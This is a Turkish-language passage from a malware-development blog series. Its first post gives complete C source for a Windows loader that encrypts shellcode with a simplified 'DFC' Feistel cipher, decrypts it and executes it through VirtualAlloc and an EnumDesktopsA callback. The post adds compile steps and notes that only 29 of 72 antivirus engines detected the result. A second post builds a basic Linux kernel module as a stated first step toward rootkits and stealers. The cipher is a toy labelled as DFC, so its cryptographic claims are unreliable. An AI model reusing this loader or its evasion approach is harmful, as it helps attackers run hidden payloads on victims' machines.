97. zararlı yazılım ve kriptografi araştırması - bölüm 6 (34): payload’u DFC algoritmasıyla şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Lüksemburg'da bir konferansta yaptığım sunum ve seminerden sonra, Windows işletim sisteminin iç yapısındaki kriptografik fonksiyonların kötüye kullanımı üzerine değindiğimde, birçok meslektaşım ve okuyucum, kötü amaçlı yazılımların geliştirilmesi sırasında kriptografinin kullanımına dair giderek daha fazla soru sormaya başladı.


Bu yazı, kötü amaçlı yazılım geliştirmede DFC (Decorrelated Fast Cipher) kullanımına ilişkin kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli şifreleme algoritmalarını incelerken, bunu payload'u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
DFC

Decorrelated Fast Cipher (DFC), 1998 yılında École Normale Supérieure, CNRS ve France Telecom’daki kriptograflar tarafından Serge Vaudenay liderliğinde geliştirildi. Gelişmiş Şifreleme Standardı (AES) yarışmasına aday olarak tasarlanan DFC, 8 tur Feistel ağı ve 128 bitlik blok boyutu kullanan simetrik bir blok şifreleme algoritmasıdır. Sonuç olarak AES standardı olarak seçilmese de, DFC özellikle PEANUT şifre ailesi içinde kriptografik araştırmalara katkıda bulundu.
Decorrelated Fast Cipher (DFC), her turda 128 bitlik bir bloğu iki 64 bitlik yarıya bölen 8 turlu bir Feistel ağına dayanır. DFC, değişken uzunlukta bir anahtardan (en fazla 256 bit) 8 benzersiz tur anahtarı oluşturmak için bir anahtar planı kullanır, ancak genellikle 128 bitlik bir anahtarla uygulanır. Her tur, bloğun bir yarısına özel bir şifreleme fonksiyonu uygular, onu diğer yarısıyla birleştirir ve ardından yarıları değiştirir – bu, anahtarların sırasını tersine çevirerek kolayca şifre çözmeyi mümkün kılan klasik bir Feistel yapısıdır.
DFC'nin mimarisi, diferansiyel ve doğrusal kriptoanalize karşı mükemmel güvenlik sağlamayı amaçlar ve modern kriptografik saldırılara karşı direnmek için şifrelenmiş veriler içindeki istatistiksel ilişkileri azaltan dekorrelasyon teorisini kullanmasıyla dikkat çeker. Her turun şifreleme fonksiyonu, ana anahtardan türetilmiş bir çift 64 bitlik alt anahtar kullanır, bu da şifreyi donanım ve yazılım uygulamaları için uygun hale getirir.
DFC, nihai AES standardı olarak seçilmese de, dekorrelasyon tabanlı saldırılara karşı dirençli yeni teknikler sundu ve simetrik blok şifreleri için güçlü güvenlik özelliklerini vurguladı. DFC şu anda, kriptoanalize karşı direncini artırmak için benzersiz matematiksel dönüşümler kullanan PEANUT ailesinin (Pretty Encryption Algorithm with n-Universal Transformation) bir üyesidir.
pratik örnek

Bunu pratikte uygulayalım. DFC tabanlı şifreleme ve şifre çözme fonksiyonlarının nasıl uygulanması gerektiğini anlamak için uygulamayı adım adım inceleyelim ve payload şifrelemeye odaklanalım. Bu yaklaşım, kodun her bölümünü ve DFC şifresinin işlevselliğine nasıl katkıda bulunduğunu anlamanıza yardımcı olacaktır.
Öncelikle sabitleri ve anahtar değişkenleri tanımlayın:
#define ROUNDS 8
#define BLOCK_SIZE 16
Ardından anahtar planı oluşturulmalıdır.
Anahtar planı fonksiyonu, orijinal şifreleme anahtarına dayalı olarak sekiz adet 128 bitlik tur anahtarı üretir. Bu tur anahtarları, Feistel turlarının her birinde veri bloğunun her yarısı üzerinde işlemler gerçekleştirmek için kullanılır:
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 16; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}
Tur anahtarları, ana anahtarın her baytının tur ve bayt indeksleri ile XORlanmasıyla türetilir, bu da her tur için benzersiz anahtarlar oluşturur.


Sonraki adım Feistel tur fonksiyonunun uygulanmasıdır. DFC’de her tur, bloğun sol ve sağ yarıları üzerinde işlemler gerçekleştirir. Tur fonksiyonu G, sol ve sağ yarıları ve bir roundKey alır.
Bu fonksiyon: sol ve sağ yarıları değiştirir ve sol yarıyı (F fonksiyonu uygulandıktan sonra) sağ yarı ve geçerli tur anahtarı ile XORlar:
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempRight = *right;
*right = *left ^ F(*right, *(uint32_t*)roundKey);
*left = tempRight;
}
F, Feistel yapısının çekirdek fonksiyonudur. Kendi uygulamamda, Decorrelated Fast Cipher (DFC) turu için F fonksiyonu, her turda doğrusal olmayanlık ve yayılımı artırmak için bit kaydırma ve XOR işlemleri kullanır:
// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
	return rotl(left + key_part, 3) ^ key_part;
}
Burada, left parametresi tipik olarak Feistel turundaki veri bloğunun sol yarısıdır, key_part ise her Feistel turuna özgü 32 bitlik bir tur anahtarı parçasıdır.
Bu fonksiyonun temel mantığı basittir.


Sol giriş (veri bloğunun yarısı), key_part ile toplanır. Bu toplama, mevcut veri ve anahtara bağlılığı artırarak her turun belirli tur anahtarına duyarlı olmasını sağlar.


Toplamanın sonucu, 3 bit sola döndürülür (rotl(..., 3)). Bit kaydırma, veriyi yaymak için kullanılır ve yayılımı artırır. Rotl fonksiyonu, bitleri 3 pozisyon sola kaydırır ve en soldaki bitler sağa döner.
Son olarak, kaydırma işleminin sonucu key_part ile XORlanır. XOR, doğrusal olmayanlığı daha da artırır ve key_part veya left'teki küçük değişikliklerin F fonksiyonunun çıktısında büyük değişikliklere neden olmasını sağlar.
Sonraki fonksiyon, blok şifreleme mantığıdır.
dfc_encrypt fonksiyonu, Feistel yapısında 8 tur boyunca şifreleme gerçekleştirir. Her tur, anahtar planından türetilmiş farklı bir tur anahtarı kullanır:
// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}
// final left-right swap
block[0] = right;
block[1] = left;
}
Bu fonksiyon, giriş bloğundan sol ve sağ değişkenleri başlatır. Ardından, 8 tur boyunca G fonksiyonunu sol ve sağ değişkenlere, ilgili tur anahtarı ile birlikte uygular.
Son olarak, sol ve sağ değişkenleri değiştirerek Feistel turunu tamamlar ve bloğu günceller.
Şifre çözme fonksiyonu dfc_decrypt, şifrelemeyi yansıtır, ancak turlar ters sırayla uygulanır:
// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final left-right swap
block[0] = right;
block[1] = left;
}
Her zamanki gibi, dfc_encrypt_shellcode, padding uygulayarak ve ardından her 128 bitlik bloğu şifreleyerek shellcode şifrelemeye hazırlar:
// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_encrypt(ptr, key);
ptr += 4; // move to the next 128-bit block (4 * 32-bit words)
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
Bu fonksiyon, key_schedule çağrısı yaparak tur anahtarlarını başlatır. Ardından, ana shellcode'u 128 bitlik bloklar halinde şifreler ve shellcode uzunluğu blok boyutunun katı değilse padding uygular.
Sonraki adım şifre çözme mantığıdır:
// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_decrypt(ptr, key);
ptr += 4;
}

// handle remaining bytes by padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
Son olarak, tümünü birleştirerek main içinde çalıştırıyoruz:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len +
(BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);
printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

dfc_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

dfc_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Gördüğünüz gibi, main fonksiyonunda sadece meow-meow messagebox payload şifreleyip çözdüm.
Tam kaynak kod hack.c:
/*
* hack.c
* encrypt/decrypt payload via DFC (Decorrelated Fast Cipher) algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/11/10/malware-cryptography-34.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8 // DFC uses 8 rounds of encryption
#define BLOCK_SIZE 16 // DFC operates on 128-bit (16-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][16];

// rotate left function
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}

// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
	return rotl(left + key_part, 3) ^ key_part;
}
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempRight = *right;
*right = *left ^ F(*right, *(uint32_t*)roundKey);
*left = tempRight;
}

// key schedule for DFC
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 16; j++) {
	K[i][j] = key[j % 8] ^ (i + j); // generate subkey for each round
}
}
}

// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];
// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
	}
	// final left-right swap
block[0] = right;
block[1] = left;
}

// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final left-right swap
block[0] = right;
block[1] = left;
}

// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_encrypt(ptr, key);
ptr += 4; // move to the next 128-bit block (4 * 32-bit words)
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_decrypt(ptr, key);
ptr += 4;
}
// handle remaining bytes by padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len +
(BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);
printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

dfc_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

dfc_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}

Her zamanki gibi, bazı yazdırma mantıkları yalnızca mantığın doğruluğunu kontrol etmek ve EnumDesktopsA aracılığıyla payload çalıştırmak içindir.
Demo

Hadi her şeyi çalışırken görelim. Derleyin (kendi Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, sadece hedef makinede (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisi hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
.text bölümündeki payload.


Kötü amaçlı yazılım tarayıcısı ile tarama:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
https://websec.net/scanner/result/8d7862b2-dbba-48bb-924c-a3694cac3269
VirusTotal'a yükleme:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/9d702d3194ef3a6160f9ab7f6b30ebaae92c365fa4
c12368c7e9ec589ebbe1fd/detection 
Gördüğünüz gibi, yalnızca 72 antivirüs motorundan 29'u dosyamızı kötü amaçlı olarak algılıyor.

İlginç sonuç.
Bildiğiniz gibi, araştırmalarımda ve bu blogdaki birçok şifreleme algoritması Feistel ağlarını kullanıyor.
cryptoanalysis


Decorrelated Fast Cipher (DFC) üzerine yapılan kriptanaliz, özellikle diferansiyel analiz yoluyla yapısındaki güvenlik açıklarını ortaya çıkarmıştır. 1999 yılında, kriptograflar Lars Knudsen ve Vincent Rijmen (Lars R. Knudsen ve Vincent Rijmen. “On The Decorrelated Fast Cipher (DFC) and Its Theory”. Department of Informatics, University of Bergen, N-5020 Bergen. 24 Mart 1999. 6. Uluslararası Hızlı Yazılım Şifreleme Çalıştayı (FSE '99). Roma: Springer-Verlag. s. 81–94) diferansiyel saldırılar kullanılarak DFC’nin 8 turdan oluşan yapısının zayıflatılabileceğini keşfetti. Çalışmaları, bir diferansiyel saldırının DFC’nin 8 turunun 6’sını başarılı bir şekilde kırabileceğini ve şifrenin Feistel turlarının belirli bölümlerine girilen farklılıklara karşı hassasiyetini ortaya çıkardı. Bu saldırı, DFC’nin yayılım özelliklerindeki zayıflıkları göstererek, AES yarışması için tasarlanmış olmasına rağmen, DFC’nin bazı diğer adaylara kıyasla kriptanalitik tekniklere karşı daha az dirençli olduğunu ortaya koydu.
Umarım bu yazı, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takım üyelerinin bu ilginç şifreleme tekniği hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.
https://en.wikipedia.org/wiki/DFC_(cipher)
On The Decorrelated Fast Cipher (DFC) and Its Theory. Lars R. Knudsen and Vincent
Rijmen
Malware And Hunting For Persistence: How Adversaries Exploit Your Windows? -
Cocomelonc. HACKLU 2024
Malware and cryptography 1
Github’taki kaynak kod


98. Linux kötü amaçlı yazılım geliştirme 1: Kernel hacklemeye giriş. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Aslında, bu gönderiye “Kötü Amaçlı Yazılım Geliştirme Hilesi Bölüm 41” gibi başka bir ad verilebilirdi, ancak burada yine okuyucularımın bana sorduğu birçok soruya cevap veriyorum. Linux için nasıl kötü amaçlı yazılım geliştirebilirim?


Belki de bu gönderi, aynı zamanda bir dizi gönderinin başlangıç noktası olacaktır (beni uzun süredir okuyanlar muhtemelen başladığım ancak henüz mantıksal sonuca ulaştırmadığım birçok farklı gönderi serim olduğunu fark etmişlerdir).

Dürüst olmak gerekirse, Linux çekirdeği için programlama konusundaki son deneyimim üniversitede yaklaşık 10+ yıl önceydi, o zamandan beri çok şey değişti, bu yüzden rootkit, stealer gibi kötü amaçlı yazılımlar yazmaya çalışmaya karar verdim...

Öncelikle, sistemimde hiçbir şeyi bozmamak için bir Linux sanal makinesi - Xubuntu 20.04 kurdum. Daha yeni bir Ubuntu (Xubuntu, Lubuntu) sürümü yükleyebileceğinizi düşünüyorum, ancak 20.04 sürümü deneyler için oldukça uygun:
+++++++++++++++++++++++++++++++++++++++++++++++
pratik örnek

Örneğin, bir kernel rootkit gibi kötü amaçlı bir yazılım oluşturmamız gerekiyorsa, geliştirdiğimiz kod, oluşturduğumuz çekirdek modüllerini kullanarak çekirdek seviyesinde ayrıcalıklarla (ring 0) çalıştırılabilir. Bu rolde çalışmanın bazı zorlukları olabilir. Bir yandan, çalışmalarımız kullanıcı ve kullanıcı alanı araçları tarafından fark edilmez. Ancak bir hata yaparsak, bunun ciddi sonuçları olabilir. Çekirdek kendi kusurlarından kendini koruyamaz, bu da tüm sistemi çökertme riskimiz olduğu anlamına gelir. Sanal makine (VM) kullanmak, Xubuntu’muzda geliştirme yapmanın zorluklarını azaltmaya yardımcı olarak bunu çok daha yönetilebilir bir gereksinim haline getirecektir.

Modülleri içe aktarmakla başlayalım:
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
Bu #include ifadeleri, çekirdek modülü programlaması için gerekli başlık dosyalarını içerir:
linux/init.h - modül başlatma ve temizleme için makrolar ve fonksiyonlar içerir.
linux/module.h - modül programlaması için makrolar ve fonksiyonlar içerir.
linux/kernel.h - çekirdek geliştirme için çeşitli fonksiyonlar ve makrolar sağlar.

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel-test-01");
MODULE_VERSION("0.001");
Bu makrolar modül hakkında meta veriler tanımlar:
MODULE_LICENSE("GPL") - modülün yayınlandığı lisansı belirtir. Burada, GNU Genel Kamu Lisansı’dır.
MODULE_AUTHOR("cocomelonc") - modülün yazarını belirtir.
MODULE_DESCRIPTION("kernel-test-01") - modül hakkında açıklama sağlar.
MODULE_VERSION("0.001") - modülün sürümünü belirtir.
Sonraki birkaç satırda başlatma fonksiyonunu tanımlıyoruz:
static int __init hack_init(void) {
printk(KERN_INFO "Meow-meow!\n");
return 0;
}
Bu fonksiyon, modülün başlatma fonksiyonudur:
static int __init hack_init(void) - fonksiyonu statik (bu dosyaya özel) olarak tanımlar ve __initmakrosunu kullanarak bir başlatma fonksiyonu olarak işaretler.
printk(KERN_INFO "Meow-meow!\n") - çekirdek günlüğüne "Meow-meow!" mesajını bilgi seviyesinde yazar.
return 0 - başarılı başlatmayı göstermek için 0 döndürür.
Sonraki fonksiyon ise hack_exit fonksiyonudur:
static void __exit hack_exit(void) {
	printk(KERN_INFO "Meow-bow!\n");
}
Bu fonksiyon, modülün temizleme fonksiyonudur:
static void __exit hack_exit(void) - fonksiyonu statik olarak tanımlar ve __exit makrosunu kullanarak bir çıkış (temizleme) fonksiyonu olarak işaretler.
printk(KERN_INFO "Meow-bow!\n") - çekirdek günlüğüne "Meow-bow!" mesajını yazar.
Daha sonra, başlatma ve temizleme fonksiyonlarını kaydediyoruz:
module_init(hack_init);
module_exit(hack_exit);
Böylece, tam kaynak kodu şu şekilde görünmektedir hack.c:
/*
* hack.c
* introduction to linux kernel hacking
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/06/20/kernel-hacking-1.html
*/
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel-test-01");
MODULE_VERSION("0.001");

static int __init hack_init(void) {
printk(KERN_INFO "Meow-meow!\n");
return 0;
}

static void __exit hack_exit(void) {
	printk(KERN_INFO "Meow-bow!\n");
}

module_init(hack_init);
module_exit(hack_exit);
Bu kod, bir Linux çekirdek modülünün temel yapısını, başlatma ve temizleme fonksiyonlarının nasıl tanımlanacağını ve modül hakkında nasıl meta veriler sağlanacağını göstermektedir.
Demo

Şimdi bu modülü çalışırken görelim. Derlemeden önce şunları yüklemeniz gerekir:
$ apt update
$ apt install build-essential linux-headers-$(uname -r)
Derlemek için şu içeriğe sahip bir Makefile dosyası oluşturun:
obj-m += hack.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

Sağlanan Makefile, bir Linux çekirdek modülünü derlemek ve temizlemek için kullanılır.
obj-m değişkeni, çekirdek modülü olarak derlenecek nesne dosyalarını listelemek için kullanılır. hack.o, hack.c kaynak dosyasından derlenecek olan nesne dosyasıdır. += operatörü, hack.o dosyasını modül olarak derlenecek nesne dosyaları listesine ekler.
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
Bu komut, modülü derlemek için make programını çağırır.
-C /lib/modules/$(shell uname -r)/build - çalışma dizinini mevcut çekirdeğin derleme dizinine değiştirir. $(shell uname -r), mevcut çekirdeğin sürümünü alır ve /lib/modules/$(shell uname -r)/build dizini, çekirdek derleme dizininin bulunduğu yerdir.
M=$(PWD) - M değişkenini mevcut çalışma dizinine ($(PWD)) ayarlar, yani modül kaynak kodunun bulunduğu yerdir. Bu, çekirdek derleme sistemine, modül kaynak dosyalarını mevcut dizinde aramasını söyler.
modules - çekirdek derleme sistemindeki bu hedef, obj-m içinde listelenen modülleri derler.
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean bu komut, modül derleme dosyalarını temizler.

Bir terminal açın, hack.c ve Makefile içeren dizine gidin:
+++++++++++++++++++++++++++++++++++++++++++++++


ve modülü derlemek için aşağıdaki komutu çalıştırın:

make
+++++++++++++++++++++++++++++++++++++++++++++++
Sonuç olarak, make komutunu çalıştırdıktan sonra birkaç yeni ara ikili dosya bulacaksınız. Ancak en önemli ekleme, yeni bir hack.ko dosyasının varlığı olacaktır.
Şimdi sırada ne var? Yeni bir terminal açın ve dmesg komutunu çalıştırın:
Dmesg
+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra, hack.ko dizininizden çalışan çekirdeğe bu modülü yüklemek için aşağıdaki komutu çalıştırın:
sudo insmod hack.ko
Şimdi, yeni bir terminalden dmesg çıktısını tekrar kontrol ederseniz, "Meow-meow!" satırını görmelisiniz:
+++++++++++++++++++++++++++++++++++++++++++++++
Çalışan çekirdekten modülümüzü silmek için sadece şu komutu çalıştırın:
sudo rmmod hack
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, çekirdek arabelleğinde "Meow-bow!" mesajı var, yani her şey beklendiği gibi mükemmel şekilde çalıştı!=..=
Tabii ki, bir uyarı daha var. Bir Linux çekirdek modülü oluştururken, modülün derlendiği belirli çekirdek sürümüne ait olduğunu unutmamak önemlidir. Eğer farklı bir çekirdeğe sahip bir sisteme modülü yüklemeye çalışırsanız, büyük olasılıkla yüklenmeyecektir.
Burada bir mola vereceğimizi düşünüyorum, rootkit ve stealer konularına bir sonraki gönderilerde bakacağız. 
Umarım bu pratik örnek içeren gönderi, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama teknikleriyle ilgilenen herkes için faydalı olmuştur.
Github’taki kaynak kod

99. linux kötü amaçlı yazılım geliştirme 2: işlemi ID’ye göre bulma. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
